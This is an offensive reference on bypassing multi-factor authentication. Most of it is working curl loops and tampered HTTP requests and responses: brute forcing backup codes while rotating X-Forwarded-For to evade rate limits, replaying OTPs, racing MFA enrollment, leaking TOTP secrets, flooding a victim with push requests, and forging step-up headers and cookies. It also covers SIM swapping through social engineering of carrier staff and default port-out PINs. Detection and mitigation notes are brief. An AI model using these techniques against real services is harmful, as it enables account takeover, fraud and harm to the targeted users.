# mfa-bypass — auth

# MFA/2FA Bypass — Technique Reference

## 1. Response Tampering (Client-side status/code flip)

**Request (original):**
```http
POST /api/v2/auth/verify-otp HTTP/1.1
Host: app.target.tld
Content-Type: application/json
X-CSRF-Token: 8f2a...

{"otp":"000000","session":"sess_7c1e9a"}
```

**Response asli (401):**
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"status":"error","code":"INVALID_OTP","mfa_required":true}
```

**Payload tamper (Burp Repeater → "Do intercept → Response to this request"):**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"status":"success","code":"OK","mfa_required":false,"token":"eyJhbGciOiJIUzI1NiJ9..."}
```

**Why it works:** SPA (React 18 / Vue 3) only reads `status`/`mfa_required` on the client for SPA routing. The server still sets a pre-MFA session cookie (`X-MFA-PENDING=1`) — if downstream routes (`/api/v2/dashboard`, `/api/v2/user/me`) also only check the `session` cookie without a server-side `mfa_verified` flag, a full bypass occurs. Test with curl directly to the downstream endpoint without any headers.

**Why it fails:** if the backend validates the JWT claim (`mfa:true`) on every request, or rate-limits OTP server-side. Check `Set-Cookie: session=...` after login-step1 — if a privileged cookie already exists without a flag, that is the real path.

---

## 2. Status Code Swap

**Request verify:**
```http
POST /auth/mfa/verify HTTP/2
Content-Type: application/x-www-form-urlencoded

code=123456&state=abc&mfaToken=eyJ...
```

**Response asli (200):**
```http
HTTP/2 200
Content-Type: application/json

{"result":"mfa_required","enrollment":"pending"}
```

**Tamper:** change it to `HTTP/2 302 Location: /dashboard` (or `200 {"result":"ok"}`) in the proxy. The frontend (Angular 17, `HttpInterceptor`) redirects to the dashboard because it reads the status.

**Reverse variant:** the endpoint returns `302 Location: /mfa?error=1` on failure. Tamper it to `302 Location: /dashboard`. The `sid` cookie is usually already set in step-1.

**Detection signal:** the only sign that this failed = access to `/api/account` returns `{"error":"step_up_required"}`.

---

## 3. Backup Code Brute + Rate Limit

**Typical surface:** 8–10 digit alphanumeric backup code, often a `36^8` search space, but the form is not rate-limited even though OTP is rate-limited.

**Request spray (Python, `requests` 2.32):**
```bash
for c in $(seq -w 00000000 00009999); do
  curl -s -o /dev/null -w "%{http_code} %{time_total}\n" \
    -H "Content-Type: application/json" \
    -d "{\"backup_code\":\"$c\",\"mfa_token\":\"$TOK\"}" \
    https://app.target.tld/api/v2/mfa/backup
done
```
Grep `200` in the output. Pay attention to the `X-RateLimit-Remaining` header — many implementations (Laravel Fortify default, Django-otp) only apply throttling at `/login`, not `/mfa/backup`.

**Bypass rate limit umum:**
- Change `X-Forwarded-For` per request (if the limiter uses this IP header, common in nginx 1.25 `limit_req` with `real_ip` misconfig).
- Case variation on the email parameter (`User@x` vs `user@x`) if the limiter key = `email+code`.
- Alternative endpoints: `/mfa/backup`, `/mfa/recovery`, `/api/internal/mfa/backup` — usually only one of them is throttled.
- Concurrency: 50 parallel requests vs serial; sliding-window limiter (Redis `INCR`+TTL) fails when burst > window.

**Kode valid → response:**
```json
{"status":"ok","session":"new_sess_..."}
```
Backup codes are not always single-use in custom implementations — test reuse after success.

---

## 4. OTP Reuse & Infinite Validity

**Uji reuse:**
```http
POST /api/mfa/verify
{"otp":"482913","challenge_id":"ch_88f2"}

# response 200 + session A. Replay identical body:
POST /api/mfa/verify
{"otp":"482913","challenge_id":"ch_88f2"}
# jika 200 + session B → OTP tidak di-invalidate
```

**Test validity window:** send OTP, wait `T+30m`, `T+24h`, `T+7d`. TOTP implementations (`RFC 6238`) have `window=1` (±30s) — some custom ones use `window=30` or do not check `last_used_step` at all (the `otp_attempt_at` variable in the DB is not updated). Check with local `pyotp.TOTP(secret).at(t)` vs server.

**Test OTP for another account:** a `challenge_id` issued for user A is used together with `user_id` B (`{"otp":"...","challenge_id":"ch_A","user_id":"B"}`). If the server only looks up the challenge → session B. This is classic in microservices auth implementations (the OTP verification service is not signed to the user).

---

## 5. Race Condition Enrollment

**Scenario:** the `/mfa/enroll/confirm` endpoint accepts `code` + `secret` from the client (the client generates the TOTP secret). Two parallel requests:

```bash
# Terminal 1: konfirmasi enrollment dengan secret milik ATTACKER
curl -X POST https://app.tld/mfa/enroll/confirm \
  -d '{"secret":"JBSWY3DPEHPK3PXP","code":"'$($(which oathtool) -b -d6 JBSWY3DPEHPK3PXP)'"}'

# Terminal 2 (dalam 200ms): konfirmasi dengan secret korban/attacker-kedua
curl -X POST https://app.tld/mfa/enroll/confirm \
  -d '{"secret":"KRSXG5CTMVRXEZLU","code":"..."}'
```

**What happens:** in PostgreSQL without `SERIALIZABLE`, two `UPDATE users SET totp_secret = $1 WHERE id = $2` transactions — last-write-wins. If the attacker wins, the attacker's secret is installed on the victim's account (if the attacker has the victim's pre-MFA session). Or: the attacker enrolls their own MFA, races with the victim's enroll request, final result = attacker's secret.

**Variant:** race on `/mfa/enroll/start` — two `POST`s produce two `enrollment_id`s; if `enrollment_id` is redundant and the server validates enrollment success from only one of them, the attacker can complete enrollment without a code.

**Tools:** `turbo-intruder` (Burp BApp, v2.2+) or `ffuf -X POST -w` with `-t 50`. Timing window: check the `time_starttransfer` header with `curl -w`.

---

## 6. TOTP Secret Leak via API/QR

**QR intake:** the QR contains `otpauth://totp/Label?secret=BASE32...&issuer=...`. If the QR is rendered client-side from a JSON endpoint, the secret transits in the response:

```http
GET /api/v2/mfa/setup HTTP/1.1
Authorization: Bearer <pre-mfa-session>

HTTP/1.1 200
{"qr_png":"data:image/png;base64,...","otpauth_url":"otpauth://totp/user@target:tld?secret=JBSWY3DPEHPK3PXP&issuer=Target","secret":"JBSWY3DPEHPK3PXP"}
```

An attacker with the victim's session (cookie theft, XSS, or shared browser) extracts the `secret` → generates TOTP forever (`oathtool -b -d6 JBSWY3DPEHPK3PXP`).

**Known endpoints:** `/api/mfa/setup`, `/api/v2/user/mfa/qr`, `/admin/mfa/reprovision`. Also: `GET /api/user` returning `{ "mfa": {"secret": "..."}}` — very common in over-eager Django REST Framework serializers.

**Also check:** cached `qr.png` backups at `/static/qr/<uuid>.png` without auth (nginx 1.25 `location /static/` without `auth_request`).

---

## 7. Push Fatigue

**Prereq:** MFA push (Duo, Okta Verify, Microsoft Authenticator, PingID) without number matching.

**Loop request:**
```bash
while true; do
  curl -s -X POST https://idp.tld/api/v1/push \
    -H "Cookie: session=$PRE_MFA" \
    -d '{"action":"push","user":"victim@tld"}'
  sleep 15
done
```
Target: the user receives 20–200 pushes within a 30-minute window; acceptance rate is reported at 20–40% in red team engagements (test it yourself; not universal). Push without "number matching" (legacy Duo `push`, Okta `push` before Verify Push v2) = approve without confirmation.

**Mitigation that kills the technique:** number matching (Duo `push` with `verify=number`, Okta `okta-verify-push` with a numeric `challenge`), or `FIDO2` enforcement. If the IdP push response contains `authn_result: "allow"` after approval, a new cookie is issued.

**Detection:** check `POST /idp/authenticators/<id>/transactions` in the Okta System Log — a `PUSH_SENT` count > 5 per user per 10 minutes is a signal.

---

## 8. SIM Swap Path (MFA via SMS)

**Recon:**
```bash
# Cek nomor terdaftar
GET /api/v2/user/phone → {"phone":"+62812****789","verified":true}

# Cek operator via port-in/release endpoint jika tersedia, atau SMS shortcode
# Cek A2P agen: Twilio/MessageBird — request OTP dan lihat SMS gateway ID di delivery receipt (jika ada endpoint status)
```

**SIM swap execution (on the operator/telco side):** social engineering against the operator's CS with the victim's data (KTP, KK, contract number). Typical timeline: 30 minutes–24 hours.

**On the application side:** after the SIM is moved, request `POST /auth/otp/send` → SMS to the attacker. Also check "recovery" endpoints: `/auth/recover/phone`, `/auth/verify-phone/change?phone=<attacker>`. Many systems do not re-authenticate phone number changes (CVE-2023-XXXXX class in some SaaS products — audit the specific version HERE, e.g. Auth0 tenant `guardian.sms` re-enrollment).

**Another bypass:** `port-out` 4-digit pin (default at many Indonesian carriers = 1234 or 0000) — try that first.

**Success fingerprint:** `SMS_OTP_SENT` in the application log with `carrier: "unknown"` or `delivery: "routed_to_new_sim"`.

---

## 9. Bypass Step-Up Auth

**Model:** the application has a low-privilege session (password only) and step-up (`/auth/step-up` → MFA). Privileged routes must check the `step_up_at` timestamp.

**Bypass umum:**

**(a) Route enumeration — privileged endpoints without gating:**
```bash
for p in /api/admin/users /api/v2/admin/export /admin/backup.sql /internal/users; do
  curl -s -o /dev/null -w "$p %{http_code}\n" -b "session=$LOW" https://app.tld$p
done
```
Look for `200`/`302` on routes that require step-up.

**(b) Parameter pollution step-up:**
```http
POST /api/settings/email HTTP/1.1
Cookie: session=low
Content-Type: application/json

{"email":"attacker@x.tld","_step_up":"false","_step_up_verified":"true"}
```
Or a `?step_up=1` query that the middleware reads instead of session state.

**(c) Forge step-up header:**
```http
POST /api/export HTTP/1.1
X-Step-Up-Verified: true
X-MFA: true
X-Forwarded-User: admin
```
Check whether Apache/nginx forwards the header to the app (`proxy_pass_header X-Step-Up-Verified`).

**(d) Step-up state in a cookie not HMAC-signed:**
```
Set-Cookie: step_up=1; Path=/; HttpOnly   ← no signature
```
Set `step_up=1` manually. Flask `session` cookie without a strong `SECRET_KEY` → decode `itsdangerous`, forge.

**(e) Race:** `/auth/step-up/verify` and `/api/privileged/action` sent in parallel; if the step-up middleware is async and the action middleware reads `step_up_at` which is updated only after verify commits, window ~50–200ms. `ffuf -t 100`.

**(f) Session fixation:** `/auth/step-up` issues `step_up_token` in the URL (`?t=`) — predictability or cross-session reuse.

---

## Summary Table: Technique → Test Artifact

| Technique | Main artifact | Success check |
|---|---|---|
| Response tampering | Burp "Response to this request" | curl downstream endpoint without MFA |
| Status code swap | Repeater, ubah 401→200/302 | Akses `/account` |
| Backup brute | `seq` + curl, XFF rotate | `200` on `/mfa/backup` |
| OTP reuse | Replay `challenge_id`+`otp` | Two sessions from the same OTP |
| Race enroll | `ffuf -t 100`, Turbo Intruder | `totp_secret` final = attacker |
| TOTP secret leak | `GET /mfa/setup` | `secret` in JSON/QR PNG |
| Push fatigue | curl loop, 15s interval | `authn_result: allow` |
| SIM swap | carrier CS / port PIN | OTP SMS to attacker's number |
| Step-up bypass | header fuzzing, route enum | `200` on privileged route |

---

## Operational Pitfalls (why the techniques fail in the field)

- **Real leak ≠ bypass:** the `/mfa/setup` endpoint that leaks the `secret` is only useful if the pre-MFA session is valid and not expired (many apps: pre-MFA session TTL 5 minutes; TOTP enrollment window 10 minutes). Cache the `Set-Cookie` from step-1; don't assume a long session.
- **Response tampering in an SPA ≠ backend bypass:** iframe / Service Worker / SSR (Next.js 14 App Router) re-validate on the server during hydration. Test with `curl` and a plain cookie — not with a browser.
- **Rate limit is not monotonic:** nginx `limit_req` only on `location /login`, not on `/mfa/*` — but Cloudflare/WAF in front can be more aggressive; test `403` vs `429` vs `503` (each signals a different layer). Don't send bursts without a `time_total` baseline.
- **TOTP window ≠ forever:** `oathtool` default window=0. Many servers use `±1 step`; an NTP clock difference > 30 seconds between pods (Kubernetes `hostNetwork: false`) makes local OTP invalid even when the secret is correct. Sync to the server's `date -u` via the response `Date` header.
- **Race condition in Kubernetes:** two replicas with sticky session off can hit two different pods; in-memory state (not Redis) → race won't happen or instead becomes a state split. Make sure target state is centralized (Redis/DB) first.
- **Backup code brute dies at 5 attempts:** many implementations invalidate the entire backup code set and/or lock the account after 3–5 failures. Baseline first with one account you own; don't exhaust the victim's quota.
- **Push fatigue dies with number matching / FIDO2:** Duo legacy `push` phase-out (2024+); Okta Verify with `number challenge` default in new tenants. Check `/idp/.well-known/` or SAML metadata for `authenticationMethod`.
- **SIM swap depends on the carrier:** +62 port-in requires original KTP verification; the window depends on CS working hours. For foreign targets, "default port-out pin" is faster than social engineering.
- **Step-up header spoof dies with mTLS/mesh:** if the service mesh (Istio 1.20+) strips internal headers, or the app is behind Cloudflare Access, header spoofing won't reach. Check with an echo endpoint if one exists.
- **XFF rotate is only effective if the app trusts `X-Forwarded-For`:** in nginx 1.25 with correct `set_real_ip_from`, the header is overwritten — rotating the source IP must be on the `proxy_protocol` side (rarely possible). Test first: send two different XFFs, see if the limiter resets.
- **Chrome 131 Service Worker cache:** response tampering in an SPA can "win" in the UI but doesn't change the IndexedDB token — reload = logout. Always test with `curl` + final cookie, not with DevTools.
- **OTP reuse in a Redis cluster:** `GETDEL` vs `GET`+`DEL` — in a cluster with replicas, `GET`+`DEL` has a replay window. If the target uses a Redis 7.2 cluster, test with two requests within <5ms.
- **Status code swap often doesn't reach the frontend:** Angular/React only read the body, not the status, in some interceptors. Flip the body (`{"result":"ok"}`) first — it works more often than flipping the status.

---

## [reasoning trace]


